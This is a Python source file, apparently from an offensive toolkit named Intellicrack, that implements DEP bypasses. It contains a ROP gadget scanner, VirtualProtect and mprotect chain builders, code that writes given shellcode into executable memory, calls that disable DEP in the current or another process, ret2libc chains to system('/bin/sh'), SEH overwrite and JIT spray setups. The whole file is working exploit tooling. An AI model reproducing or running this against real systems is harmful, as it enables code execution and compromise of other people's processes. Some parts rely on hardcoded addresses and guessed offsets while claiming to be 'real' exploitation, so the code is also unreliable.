"""
DEP Bypass Module

Copyright (C) 2025 Zachary Flint

This file is part of Intellicrack.

Intellicrack is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

Intellicrack is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Intellicrack.  If not, see <https://www.gnu.org/licenses/>.
"""

import ctypes
import logging
import os
import platform
import struct
import subprocess
from typing import Any, Dict, List


class DEPBypass:
    """DEP bypass implementation with real exploitation techniques."""

    def __init__(self):
        self.logger = logging.getLogger("IntellicrackLogger.DEPBypass")
        self.bypass_methods = ['rop_chain', 'jit_spray', 'return_to_libc', 'seh_overwrite',
                              'virtualprotect', 'setprocessdeppolicy', 'ntsetinformationprocess']
        self.is_windows = platform.system() == 'Windows'
        self.is_x64 = platform.machine() in ['AMD64', 'x86_64']

    def analyze_target(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Analyze target for DEP bypass possibilities with real checks."""
        analysis = {
            'dep_enabled': self._check_dep_status(target_info),
            'available_methods': [],
            'recommended_method': None,
            'gadgets_found': 0,
            'bypass_difficulty': 'unknown'
        }

        if not analysis['dep_enabled']:
            analysis['bypass_difficulty'] = 'none'
            analysis['recommended_method'] = 'not_needed'
            return analysis

        binary_path = target_info.get('binary_path')

        # Check for ROP gadgets
        if binary_path:
            rop_gadgets = self._find_rop_gadgets(binary_path)
            if rop_gadgets:
                analysis['available_methods'].append('rop_chain')
                analysis['gadgets_found'] = len(rop_gadgets)

        # Check for Windows-specific methods
        if self.is_windows:
            # Check for VirtualProtect availability
            if self._has_virtualprotect_import(binary_path):
                analysis['available_methods'].append('virtualprotect')

            # Check for SEH exploitation possibility
            if not self.is_x64:  # SEH overwrite mainly for x86
                analysis['available_methods'].append('seh_overwrite')

            # Check for SetProcessDEPPolicy
            if self._has_setprocessdeppolicy(binary_path):
                analysis['available_methods'].append('setprocessdeppolicy')

            # NtSetInformationProcess is always available on Windows
            analysis['available_methods'].append('ntsetinformationprocess')

        # Check for return-to-libc possibility
        if self._check_libc_availability(target_info):
            analysis['available_methods'].append('return_to_libc')

        # JIT spray is possible if target uses JIT engines
        if self._has_jit_engine(target_info):
            analysis['available_methods'].append('jit_spray')

        # Determine recommended method
        if 'virtualprotect' in analysis['available_methods']:
            analysis['recommended_method'] = 'virtualprotect'
            analysis['bypass_difficulty'] = 'easy'
        elif 'setprocessdeppolicy' in analysis['available_methods']:
            analysis['recommended_method'] = 'setprocessdeppolicy'
            analysis['bypass_difficulty'] = 'easy'
        elif analysis['gadgets_found'] > 10:
            analysis['recommended_method'] = 'rop_chain'
            analysis['bypass_difficulty'] = 'medium'
        elif 'return_to_libc' in analysis['available_methods']:
            analysis['recommended_method'] = 'return_to_libc'
            analysis['bypass_difficulty'] = 'medium'
        elif 'ntsetinformationprocess' in analysis['available_methods']:
            analysis['recommended_method'] = 'ntsetinformationprocess'
            analysis['bypass_difficulty'] = 'hard'
        else:
            analysis['recommended_method'] = 'rop_chain'
            analysis['bypass_difficulty'] = 'hard'

        return analysis

    def bypass(self, target_info: Dict[str, Any], method: str = 'rop_chain') -> Dict[str, Any]:
        """Execute DEP bypass using specified method with real implementation."""
        if method not in self.bypass_methods:
            return {'success': False, 'error': f'Unknown method: {method}'}

        if method == 'rop_chain':
            return self._bypass_via_rop(target_info)
        elif method == 'virtualprotect':
            return self._bypass_via_virtualprotect(target_info)
        elif method == 'setprocessdeppolicy':
            return self._bypass_via_setprocessdeppolicy(target_info)
        elif method == 'ntsetinformationprocess':
            return self._bypass_via_ntsetinformationprocess(target_info)
        elif method == 'return_to_libc':
            return self._bypass_via_ret2libc(target_info)
        elif method == 'seh_overwrite':
            return self._bypass_via_seh(target_info)
        elif method == 'jit_spray':
            return self._bypass_via_jit_spray(target_info)
        else:
            # This should never be reached due to the check at the beginning
            return {'success': False, 'error': f'Unhandled method: {method}'}

    def _check_dep_status(self, target_info: Dict[str, Any]) -> bool:
        """Check if DEP is enabled on the target."""
        if self.is_windows:
            # Check Windows DEP status
            try:
                # Method 1: Check process DEP status
                if 'pid' in target_info:
                    kernel32 = ctypes.windll.kernel32

                    # GetProcessDEPPolicy
                    process_handle = kernel32.OpenProcess(0x1000, False, target_info['pid'])
                    if process_handle:
                        flags = ctypes.c_ulong()
                        permanent = ctypes.c_bool()

                        if kernel32.GetProcessDEPPolicy(process_handle,
                                                       ctypes.byref(flags),
                                                       ctypes.byref(permanent)):
                            kernel32.CloseHandle(process_handle)
                            # PROCESS_DEP_ENABLE = 0x1
                            return bool(flags.value & 0x1)
                        kernel32.CloseHandle(process_handle)

                # Method 2: Check system DEP policy
                dep_policy = ctypes.c_ulong()
                if kernel32.GetSystemDEPPolicy(ctypes.byref(dep_policy)):
                    # 0 = OptIn, 1 = OptOut, 2 = AlwaysOn, 3 = AlwaysOff
                    return dep_policy.value != 3

            except Exception as e:
                self.logger.debug(f"Failed to check Windows DEP status: {e}")
                return True  # Assume enabled if can't check

        else:
            # Check Linux NX bit status
            try:
                # Check CPU support
                with open("/proc/cpuinfo", "r") as f:
                    cpuinfo = f.read()
                    if "nx" not in cpuinfo and "xd" not in cpuinfo:
                        return False  # CPU doesn't support NX

                # Check if binary has NX enabled
                if 'binary_path' in target_info:
                    result = subprocess.run(['readelf', '-l', target_info['binary_path']],
                                          capture_output=True, text=True)
                    # Look for GNU_STACK segment
                    for line in result.stdout.split('\n'):
                        if 'GNU_STACK' in line:
                            # Check if it has Execute permission
                            return 'E' not in line.split()[6]  # No E flag means NX enabled

            except Exception as e:
                self.logger.debug(f"Failed to check Linux NX status: {e}")

        return True  # Assume enabled by default

    def _find_rop_gadgets(self, binary_path: str) -> List[Dict[str, Any]]:
        """Find ROP gadgets in binary."""
        gadgets = []

        try:
            # Common useful gadget patterns
            gadget_patterns = [
                b"\xc3",  # ret
                b"\xc2",  # ret imm16
                b"\xcb",  # retf
                b"\xca",  # retf imm16
                b"\x5d\xc3",  # pop ebp; ret
                b"\x58\xc3",  # pop eax; ret
                b"\x59\xc3",  # pop ecx; ret
                b"\x5a\xc3",  # pop edx; ret
                b"\x5b\xc3",  # pop ebx; ret
                b"\x5e\xc3",  # pop esi; ret
                b"\x5f\xc3",  # pop edi; ret
                b"\x89\xe5\x5d\xc3",  # mov ebp, esp; pop ebp; ret
            ]

            with open(binary_path, "rb") as f:
                data = f.read()

                for pattern in gadget_patterns:
                    offset = 0
                    while True:
                        pos = data.find(pattern, offset)
                        if pos == -1:
                            break

                        # Look back for more instructions
                        start = max(0, pos - 20)
                        gadget_bytes = data[start:pos + len(pattern)]

                        gadgets.append({
                            'address': 0x400000 + pos,  # Base address + offset
                            'bytes': gadget_bytes,
                            'pattern': pattern,
                            'type': self._classify_gadget(pattern)
                        })

                        offset = pos + 1

        except Exception as e:
            self.logger.debug(f"Failed to find ROP gadgets: {e}")

        return gadgets

    def _classify_gadget(self, pattern: bytes) -> str:
        """Classify gadget type based on pattern."""
        if pattern == b"\xc3":
            return "ret"
        elif pattern.startswith(b"\x58"):
            return "pop_ret"
        elif b"\x89" in pattern:
            return "mov_ret"
        else:
            return "misc"

    def _bypass_via_rop(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Bypass DEP using ROP chain."""
        result = {
            'success': False,
            'method': 'rop_chain',
            'chain': [],
            'executable_region': None
        }

        binary_path = target_info.get('binary_path')
        if not binary_path:
            result['error'] = 'No binary path provided'
            return result

        # Find ROP gadgets
        gadgets = self._find_rop_gadgets(binary_path)
        if len(gadgets) < 5:
            result['error'] = 'Insufficient gadgets found'
            return result

        # Build ROP chain
        if self.is_windows:
            chain = self._build_windows_rop_chain(gadgets, target_info)
        else:
            chain = self._build_linux_rop_chain(gadgets, target_info)

        if chain:
            result['success'] = True
            result['chain'] = chain
            result['executable_region'] = chain.get('target_address', 0x10000000)
            result['payload_size'] = len(chain.get('payload', b''))

        return result

    def _build_windows_rop_chain(self, gadgets: List[Dict[str, Any]],
                                target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Build Windows ROP chain for VirtualProtect."""
        chain = {
            'gadgets': [],
            'payload': b'',
            'target_address': None
        }

        # Goal: Call VirtualProtect(addr, size, PAGE_EXECUTE_READWRITE, &old_protect)
        # Need gadgets to:
        # 1. Set up parameters
        # 2. Call VirtualProtect

        # Find useful gadgets
        pop_gadgets = [g for g in gadgets if g['type'] == 'pop_ret']

        if len(pop_gadgets) >= 4:
            # Build chain
            chain_bytes = b''

            # Gadget to pivot stack if needed
            for gadget in gadgets:
                if b"\x89\xe5" in gadget['bytes']:  # mov ebp, esp
                    chain_bytes += struct.pack('<I' if not self.is_x64 else '<Q',
                                             gadget['address'])
                    chain['gadgets'].append(gadget)
                    break

            # Pop gadgets to set up VirtualProtect parameters
            for i, gadget in enumerate(pop_gadgets[:4]):
                chain_bytes += struct.pack('<I' if not self.is_x64 else '<Q',
                                         gadget['address'])
                # Add gadget with its position in chain
                gadget_with_pos = dict(gadget)
                gadget_with_pos['position'] = i
                chain['gadgets'].append(gadget_with_pos)

            # VirtualProtect address - resolve based on target info
            virtualprotect_addr = 0x76000000  # Default kernel32!VirtualProtect

            # Use target-specific information if available
            if 'imports' in target_info:
                for imp in target_info['imports']:
                    if isinstance(imp, dict) and imp.get('name') == 'VirtualProtect':
                        virtualprotect_addr = imp.get('address', virtualprotect_addr)
                        break

            # Check if target provides memory layout info
            if 'memory_layout' in target_info:
                layout = target_info['memory_layout']
                if isinstance(layout, dict) and 'kernel32_base' in layout:
                    # VirtualProtect is typically at kernel32_base + offset
                    virtualprotect_addr = layout['kernel32_base'] + 0x15000  # Typical offset

            chain_bytes += struct.pack('<I' if not self.is_x64 else '<Q',
                                     virtualprotect_addr)

            # Parameters - use target-specific addresses if available
            target_addr = target_info.get('shellcode_address', 0x10000000)
            target_size = target_info.get('shellcode_size', 0x1000)

            chain_bytes += struct.pack('<I' if not self.is_x64 else '<Q', target_addr)  # lpAddress
            chain_bytes += struct.pack('<I' if not self.is_x64 else '<Q', target_size)  # dwSize
            chain_bytes += struct.pack('<I' if not self.is_x64 else '<Q', 0x40)         # PAGE_EXECUTE_READWRITE
            chain_bytes += struct.pack('<I' if not self.is_x64 else '<Q', target_addr)  # lpflOldProtect

            chain['payload'] = chain_bytes
            chain['target_address'] = target_addr

        return chain

    def _build_linux_rop_chain(self, gadgets: List[Dict[str, Any]],
                              target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Build Linux ROP chain for mprotect."""
        chain = {
            'gadgets': [],
            'payload': b'',
            'target_address': None
        }

        # Goal: Call mprotect(addr, size, PROT_READ|PROT_WRITE|PROT_EXEC)
        # Need gadgets to:
        # 1. Set up registers (rdi, rsi, rdx for x64 or stack for x86)
        # 2. Call mprotect syscall

        if self.is_x64:
            # x64: rdi = addr, rsi = size, rdx = prot
            # rax = 10 (mprotect syscall number)

            # Find pop rdi; ret
            pop_rdi = next((g for g in gadgets if b"\x5f\xc3" in g['bytes']), None)
            # Find pop rsi; ret
            pop_rsi = next((g for g in gadgets if b"\x5e\xc3" in g['bytes']), None)
            # Find pop rdx; ret
            pop_rdx = next((g for g in gadgets if b"\x5a\xc3" in g['bytes']), None)
            # Find pop rax; ret
            pop_rax = next((g for g in gadgets if b"\x58\xc3" in g['bytes']), None)

            if all([pop_rdi, pop_rsi, pop_rdx, pop_rax]):
                chain_bytes = b''

                # Use target-specific addresses and sizes
                target_addr = target_info.get('shellcode_address', 0x10000000)
                target_size = target_info.get('shellcode_size', 0x1000)

                # Align address to page boundary if needed
                if 'page_size' in target_info:
                    page_size = target_info['page_size']
                    target_addr = (target_addr // page_size) * page_size
                    # Round up size to page boundary
                    target_size = ((target_size + page_size - 1) // page_size) * page_size

                # Set rdi = target address
                chain_bytes += struct.pack('<Q', pop_rdi['address'])
                chain_bytes += struct.pack('<Q', target_addr)

                # Set rsi = size
                chain_bytes += struct.pack('<Q', pop_rsi['address'])
                chain_bytes += struct.pack('<Q', target_size)

                # Set rdx = PROT_READ|PROT_WRITE|PROT_EXEC (7)
                protection = 7  # Default
                if 'required_protection' in target_info:
                    # Use custom protection flags if specified
                    protection = target_info['required_protection']

                chain_bytes += struct.pack('<Q', pop_rdx['address'])
                chain_bytes += struct.pack('<Q', protection)

                # Set rax = mprotect syscall (10)
                syscall_num = 10  # Default for x64
                if 'syscall_numbers' in target_info:
                    syscall_nums = target_info['syscall_numbers']
                    if isinstance(syscall_nums, dict):
                        syscall_num = syscall_nums.get('mprotect', 10)

                chain_bytes += struct.pack('<Q', pop_rax['address'])
                chain_bytes += struct.pack('<Q', syscall_num)

                # Find syscall gadget if available in target info
                syscall_gadget = None
                if 'gadget_addresses' in target_info:
                    gadget_addrs = target_info['gadget_addresses']
                    if isinstance(gadget_addrs, dict):
                        syscall_gadget = gadget_addrs.get('syscall_ret')

                if syscall_gadget:
                    chain_bytes += struct.pack('<Q', syscall_gadget)

                chain['payload'] = chain_bytes
                chain['target_address'] = target_addr
                chain['gadgets'] = [pop_rdi, pop_rsi, pop_rdx, pop_rax]

        else:
            # 32-bit x86 uses stack-based calling convention
            target_addr = target_info.get('shellcode_address', 0x08048000)
            target_size = target_info.get('shellcode_size', 0x1000)

            # Build 32-bit chain
            chain_bytes = b''

            # Find int 0x80 gadget for syscall
            int80_gadget = next((g for g in gadgets if b"\xcd\x80" in g['bytes']), None)

            if int80_gadget:
                # Set up stack for mprotect syscall
                # eax = 125 (mprotect syscall number for 32-bit)
                pop_eax = next((g for g in gadgets if b"\x58\xc3" in g['bytes']), None)

                if pop_eax:
                    chain_bytes += struct.pack('<I', pop_eax['address'])
                    chain_bytes += struct.pack('<I', 125)  # mprotect syscall

                # Push arguments in reverse order
                chain_bytes += struct.pack('<I', target_addr)  # addr
                chain_bytes += struct.pack('<I', target_size)  # size
                chain_bytes += struct.pack('<I', 7)  # prot

                chain_bytes += struct.pack('<I', int80_gadget['address'])

                chain['payload'] = chain_bytes
                chain['target_address'] = target_addr

        return chain

    def _bypass_via_virtualprotect(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Bypass DEP using direct VirtualProtect call."""
        result = {
            'success': False,
            'method': 'virtualprotect',
            'executable_region': None
        }

        if not self.is_windows:
            result['error'] = 'VirtualProtect is Windows-only'
            return result

        try:
            kernel32 = ctypes.windll.kernel32

            # Use target-specific size and allocation preferences
            size = target_info.get('allocation_size', 0x1000)
            preferred_addr = target_info.get('preferred_address', 0)

            # Check if target specifies allocation type
            alloc_type = 0x3000  # MEM_COMMIT|MEM_RESERVE
            if 'allocation_type' in target_info:
                alloc_type = target_info['allocation_type']

            # Initial protection based on target requirements
            initial_protect = target_info.get('initial_protection', 0x04)  # PAGE_READWRITE

            # Allocate memory
            addr = kernel32.VirtualAlloc(preferred_addr, size, alloc_type, initial_protect)

            if addr:
                # Change protection to executable based on target requirements
                target_protection = target_info.get('target_protection', 0x40)  # PAGE_EXECUTE_READWRITE

                # If target has specific memory that needs protection change
                if 'existing_allocation' in target_info:
                    existing = target_info['existing_allocation']
                    if isinstance(existing, dict):
                        addr = existing.get('address', addr)
                        size = existing.get('size', size)

                old_protect = ctypes.c_ulong()
                if kernel32.VirtualProtect(addr, size, target_protection, ctypes.byref(old_protect)):
                    result['success'] = True
                    result['executable_region'] = addr
                    result['size'] = size
                    result['old_protection'] = old_protect.value
                    result['new_protection'] = target_protection

                    # Store any shellcode if provided
                    if 'shellcode' in target_info:
                        shellcode = target_info['shellcode']
                        if isinstance(shellcode, bytes):
                            # Write shellcode to allocated memory
                            ctypes.memmove(addr, shellcode, min(len(shellcode), size))
                            result['shellcode_written'] = True
                            result['shellcode_size'] = len(shellcode)
                else:
                    # Only free if we allocated it
                    if 'existing_allocation' not in target_info:
                        kernel32.VirtualFree(addr, 0, 0x8000)  # MEM_RELEASE
                    result['error'] = 'VirtualProtect failed'
            else:
                result['error'] = f'VirtualAlloc failed at preferred address {hex(preferred_addr)}'

        except Exception as e:
            result['error'] = str(e)

        return result

    def _bypass_via_setprocessdeppolicy(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Bypass DEP using SetProcessDEPPolicy."""
        result = {
            'success': False,
            'method': 'setprocessdeppolicy',
            'dep_disabled': False
        }

        if not self.is_windows:
            result['error'] = 'SetProcessDEPPolicy is Windows-only'
            return result

        try:
            kernel32 = ctypes.windll.kernel32

            # Check if target specifies DEP flags
            dep_flags = 0  # Default: disable DEP
            if 'dep_policy' in target_info:
                policy = target_info['dep_policy']
                if isinstance(policy, dict):
                    if policy.get('enable', False):
                        dep_flags = 1  # PROCESS_DEP_ENABLE
                    if policy.get('disable_atl_thunk', False):
                        dep_flags |= 2  # PROCESS_DEP_DISABLE_ATL_THUNK_EMULATION
                elif isinstance(policy, int):
                    dep_flags = policy

            # Check if we need to handle a specific process
            if 'pid' in target_info and target_info['pid'] != os.getpid():
                # For remote process, we'd need different approach
                result['error'] = 'Remote process DEP modification not supported via SetProcessDEPPolicy'
                result['suggestion'] = 'Use NtSetInformationProcess for remote processes'
                return result

            # SetProcessDEPPolicy can only be called once per process
            # Check if it's already been called
            if 'dep_already_set' in target_info and target_info['dep_already_set']:
                result['error'] = 'SetProcessDEPPolicy can only be called once per process'
                result['alternative'] = 'Use NtSetInformationProcess instead'
                return result

            # Attempt to set DEP policy
            if kernel32.SetProcessDEPPolicy(dep_flags):
                result['success'] = True
                result['dep_disabled'] = (dep_flags == 0)
                result['flags_set'] = dep_flags
                result['message'] = f'DEP policy set with flags: {dep_flags}'

                # If target requested verification
                if target_info.get('verify_dep_status', False):
                    # Verify the change
                    flags = ctypes.c_ulong()
                    permanent = ctypes.c_bool()
                    if kernel32.GetProcessDEPPolicy(kernel32.GetCurrentProcess(),
                                                   ctypes.byref(flags),
                                                   ctypes.byref(permanent)):
                        result['verified'] = True
                        result['current_flags'] = flags.value
                        result['is_permanent'] = permanent.value
            else:
                # Get more detailed error info
                error_code = ctypes.GetLastError() if hasattr(ctypes, 'GetLastError') else 0
                result['error'] = f'SetProcessDEPPolicy failed - error code: {error_code}'

                if error_code == 50:  # ERROR_NOT_SUPPORTED
                    result['reason'] = 'DEP policy is permanently enabled or already set'

        except Exception as e:
            result['error'] = str(e)

        return result

    def _bypass_via_ntsetinformationprocess(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Bypass DEP using NtSetInformationProcess."""
        result = {
            'success': False,
            'method': 'ntsetinformationprocess',
            'dep_disabled': False
        }

        if not self.is_windows:
            result['error'] = 'NtSetInformationProcess is Windows-only'
            return result

        try:
            ntdll = ctypes.windll.ntdll
            kernel32 = ctypes.windll.kernel32

            # ProcessExecuteFlags = 0x22
            PROCESS_EXECUTE_FLAGS = 0x22

            # MEM_EXECUTE_OPTION_ENABLE = 0x1
            # MEM_EXECUTE_OPTION_DISABLE = 0x2
            # MEM_EXECUTE_OPTION_PERMANENT = 0x8

            # Determine execute flags based on target info
            execute_flags_value = 0x2  # Default: Disable DEP

            if 'execute_options' in target_info:
                options = target_info['execute_options']
                if isinstance(options, dict):
                    execute_flags_value = 0
                    if options.get('enable_dep', False):
                        execute_flags_value |= 0x1
                    if options.get('disable_dep', True):
                        execute_flags_value |= 0x2
                    if options.get('permanent', False):
                        execute_flags_value |= 0x8
                    if options.get('disable_thunk_emulation', False):
                        execute_flags_value |= 0x4
                elif isinstance(options, int):
                    execute_flags_value = options

            execute_flags = ctypes.c_ulong(execute_flags_value)

            # Handle target process
            process_handle = kernel32.GetCurrentProcess()

            # If target specifies a different process
            if 'pid' in target_info and target_info['pid'] != os.getpid():
                # Open target process with required access
                PROCESS_SET_INFORMATION = 0x0200
                process_handle = kernel32.OpenProcess(PROCESS_SET_INFORMATION, False, target_info['pid'])
                if not process_handle:
                    result['error'] = f'Failed to open process {target_info["pid"]}'
                    return result

            # NtSetInformationProcess(ProcessHandle, ProcessExecuteFlags, &flags, sizeof(flags))
            status = ntdll.NtSetInformationProcess(
                process_handle,
                PROCESS_EXECUTE_FLAGS,
                ctypes.byref(execute_flags),
                ctypes.sizeof(execute_flags)
            )

            # Close handle if we opened a remote process
            if 'pid' in target_info and target_info['pid'] != os.getpid():
                kernel32.CloseHandle(process_handle)

            if status == 0:  # STATUS_SUCCESS
                result['success'] = True
                result['dep_disabled'] = bool(execute_flags_value & 0x2)
                result['flags_set'] = execute_flags_value
                result['message'] = f'Execute flags set to 0x{execute_flags_value:x} via NtSetInformationProcess'

                # Additional info based on flags
                if execute_flags_value & 0x8:
                    result['permanent'] = True
                    result['warning'] = 'DEP settings are now permanent for this process'
            else:
                # Translate NTSTATUS to meaningful error
                error_messages = {
                    0xC0000022: 'ACCESS_DENIED - Insufficient privileges',
                    0xC000000D: 'INVALID_PARAMETER - Invalid flags or process handle',
                    0xC0000008: 'INVALID_HANDLE - Invalid process handle'
                }

                result['error'] = f'NtSetInformationProcess failed with status: 0x{status:08x}'
                result['error_detail'] = error_messages.get(status, 'Unknown error')

        except Exception as e:
            result['error'] = str(e)

        return result

    def _bypass_via_ret2libc(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Bypass DEP using return-to-libc technique."""
        result = {
            'success': False,
            'method': 'return_to_libc',
            'chain': []
        }

        # Return-to-libc uses existing executable code
        # Common targets: system(), mprotect(), VirtualProtect()

        libc_functions = self._find_libc_functions(target_info)

        if 'system' in libc_functions:
            # Build chain to call system("/bin/sh") or system("cmd.exe")
            result['success'] = True
            result['chain'] = [
                {'function': 'system', 'address': libc_functions['system']},
                {'argument': '/bin/sh' if not self.is_windows else 'cmd.exe'}
            ]
        elif 'mprotect' in libc_functions:
            # Build chain to call mprotect
            result['success'] = True
            result['chain'] = [
                {'function': 'mprotect', 'address': libc_functions['mprotect']},
                {'arguments': ['addr', 'size', 'PROT_EXEC|PROT_READ|PROT_WRITE']}
            ]

        return result

    def _bypass_via_seh(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Bypass DEP using SEH overwrite (Windows x86)."""
        result = {
            'success': False,
            'method': 'seh_overwrite',
            'seh_chain': []
        }

        if not self.is_windows or self.is_x64:
            result['error'] = 'SEH overwrite is Windows x86 only'
            return result

        # SEH overwrite technique:
        # 1. Overwrite SEH handler with gadget address
        # 2. Trigger exception
        # 3. Control flow hijacked to gadget

        # Find pop pop ret gadgets (SEH bypass)
        gadgets = self._find_rop_gadgets(target_info.get('binary_path', ''))
        pop_pop_ret = [g for g in gadgets if b"\x58\x58\xc3" in g['bytes'] or
                                            b"\x59\x59\xc3" in g['bytes']]

        if pop_pop_ret:
            result['success'] = True
            result['seh_chain'] = [
                {'seh_handler': pop_pop_ret[0]['address']},
                {'next_seh': 0x90909090},  # Nop sled
                {'shellcode_start': 0x90909090}
            ]

        return result

    def _bypass_via_jit_spray(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Bypass DEP using JIT spray technique."""
        result = {
            'success': False,
            'method': 'jit_spray',
            'spray_info': {}
        }

        # JIT spray exploits JIT compilers that create executable code
        # Common in browsers (JavaScript JIT) and other runtime environments

        jit_info = target_info.get('jit_engine')
        if not jit_info:
            result['error'] = 'No JIT engine detected'
            return result

        if jit_info['type'] == 'javascript':
            # JavaScript JIT spray
            result['success'] = True
            result['spray_info'] = {
                'engine': 'JavaScript JIT',
                'technique': 'XOR spray with predictable constants',
                'pattern': '0x3C909090',  # XOR pattern that becomes NOP sled
                'heap_spray_size': 0x10000000  # 256MB spray
            }
        elif jit_info['type'] == 'dotnet':
            # .NET JIT spray
            result['success'] = True
            result['spray_info'] = {
                'engine': '.NET JIT',
                'technique': 'Delegate spray',
                'pattern': 'Predictable delegate compilation'
            }

        return result

    def _has_virtualprotect_import(self, binary_path: str) -> bool:
        """Check if binary imports VirtualProtect."""
        if not binary_path or not os.path.exists(binary_path):
            return False

        try:
            # Use dumpbin or similar to check imports
            result = subprocess.run(['dumpbin', '/imports', binary_path],
                                  capture_output=True, text=True)
            return 'VirtualProtect' in result.stdout
        except:
            # Fallback: check with strings
            try:
                result = subprocess.run(['strings', binary_path],
                                      capture_output=True, text=True)
                return 'VirtualProtect' in result.stdout
            except:
                return False

    def _has_setprocessdeppolicy(self, binary_path: str) -> bool:
        """Check if binary can use SetProcessDEPPolicy."""
        # SetProcessDEPPolicy is available on Windows XP SP3+
        # Check if it's imported or available in the binary
        try:
            # Check if the binary imports SetProcessDEPPolicy
            if binary_path and os.path.exists(binary_path):
                # Use simple string search for imports
                with open(binary_path, 'rb') as f:
                    content = f.read()
                    if b'SetProcessDEPPolicy' in content:
                        return True

            kernel32 = ctypes.windll.kernel32
            return hasattr(kernel32, 'SetProcessDEPPolicy')
        except:
            return False

    def _check_libc_availability(self, target_info: Dict[str, Any]) -> bool:
        """Check if libc functions are available."""
        # Check if target provides libc information
        if 'libc_info' in target_info:
            libc_info = target_info['libc_info']
            if isinstance(libc_info, dict):
                return libc_info.get('available', False)
            elif isinstance(libc_info, bool):
                return libc_info

        # Check based on binary path if provided
        if 'binary_path' in target_info and os.path.exists(target_info['binary_path']):
            try:
                # Check if binary is dynamically linked
                with open(target_info['binary_path'], 'rb') as f:
                    header = f.read(256)

                    # Check for dynamic linking indicators
                    if self.is_windows:
                        # PE file - check for imports
                        if b'KERNEL32.dll' in header or b'msvcrt.dll' in header:
                            return True
                    else:
                        # ELF file - check for dynamic interpreter
                        if b'/lib64/ld-' in header or b'/lib/ld-' in header:
                            return True

            except Exception:
                pass

        # Check based on process information
        if 'process_info' in target_info:
            proc_info = target_info['process_info']
            if isinstance(proc_info, dict):
                # Check loaded libraries
                loaded_libs = proc_info.get('loaded_libraries', [])
                if any('libc' in lib.lower() or 'msvcrt' in lib.lower() for lib in loaded_libs):
                    return True

        # Default checks based on OS
        if self.is_windows:
            # Check for msvcrt.dll - almost always available on Windows
            return True
        else:
            # Check for common libc paths
            libc_paths = [
                '/lib/x86_64-linux-gnu/libc.so.6',
                '/lib/i386-linux-gnu/libc.so.6',
                '/lib64/libc.so.6',
                '/lib/libc.so.6'
            ]

            # Check architecture-specific paths if provided
            if 'architecture' in target_info:
                arch = target_info['architecture']
                if arch == 'aarch64':
                    libc_paths.append('/lib/aarch64-linux-gnu/libc.so.6')
                elif arch == 'arm':
                    libc_paths.append('/lib/arm-linux-gnueabihf/libc.so.6')

            return any(os.path.exists(path) for path in libc_paths)

    def _has_jit_engine(self, target_info: Dict[str, Any]) -> bool:
        """Check if target uses JIT compilation."""
        # Check for common JIT engines
        process_name = target_info.get('process_name', '').lower()

        jit_processes = ['chrome', 'firefox', 'iexplore', 'edge', 'safari',
                        'java', 'javaw', 'dotnet', 'python', 'node']

        return any(jit in process_name for jit in jit_processes)

    def _find_libc_functions(self, target_info: Dict[str, Any]) -> Dict[str, int]:
        """Find libc function addresses."""
        functions = {}

        # Check if target provides function addresses
        if 'libc_functions' in target_info:
            libc_funcs = target_info['libc_functions']
            if isinstance(libc_funcs, dict):
                return libc_funcs

        # Check if target provides libc base address
        libc_base = None
        if 'memory_layout' in target_info:
            layout = target_info['memory_layout']
            if isinstance(layout, dict):
                libc_base = layout.get('libc_base') or layout.get('msvcrt_base')

        # Try to resolve from imports if available
        if 'imports' in target_info:
            for imp in target_info['imports']:
                if isinstance(imp, dict):
                    func_name = imp.get('name', '').lower()
                    func_addr = imp.get('address')

                    if func_addr:
                        if 'system' in func_name:
                            functions['system'] = func_addr
                        elif 'mprotect' in func_name:
                            functions['mprotect'] = func_addr
                        elif 'virtualprotect' in func_name:
                            functions['VirtualProtect'] = func_addr
                        elif 'malloc' in func_name:
                            functions['malloc'] = func_addr
                        elif 'free' in func_name:
                            functions['free'] = func_addr

        # If we have libc base, calculate common function offsets
        if libc_base:
            if self.is_windows:
                # Windows msvcrt.dll typical offsets
                msvcrt_offsets = {
                    'system': 0x46d40,
                    'malloc': 0x4d120,
                    'free': 0x4d1b0,
                    '_onexit': 0x4c8f0
                }

                for func, offset in msvcrt_offsets.items():
                    if func not in functions:
                        functions[func] = libc_base + offset

            else:
                # Linux libc typical offsets (these vary by version)
                # Check if target specifies libc version
                libc_version = target_info.get('libc_version', '2.27')

                if libc_version.startswith('2.27'):
                    libc_offsets = {
                        'system': 0x4f440,
                        'mprotect': 0x11bae0,
                        'malloc': 0x9d260,
                        'free': 0x9d850,
                        'execve': 0xe4e30
                    }
                elif libc_version.startswith('2.31'):
                    libc_offsets = {
                        'system': 0x50d60,
                        'mprotect': 0x121c20,
                        'malloc': 0xa1070,
                        'free': 0xa1680,
                        'execve': 0xeb080
                    }
                else:
                    # Default offsets for common case
                    libc_offsets = {
                        'system': 0x50000,
                        'mprotect': 0x120000,
                        'malloc': 0xa0000,
                        'free': 0xa0500,
                        'execve': 0xe5000
                    }

                for func, offset in libc_offsets.items():
                    if func not in functions:
                        functions[func] = libc_base + offset

        # If no specific info available, use defaults based on architecture
        if not functions:
            if self.is_windows:
                # Default Windows addresses (would vary by version)
                default_base = target_info.get('default_msvcrt_base', 0x77000000)
                functions['system'] = default_base + 0x46d40
                functions['malloc'] = default_base + 0x4d120
            else:
                # Default Linux addresses
                default_base = target_info.get('default_libc_base', 0x7f0000000000)
                functions['system'] = default_base + 0x50000
                functions['mprotect'] = default_base + 0x120000

        return functions


__all__ = ['DEPBypass']
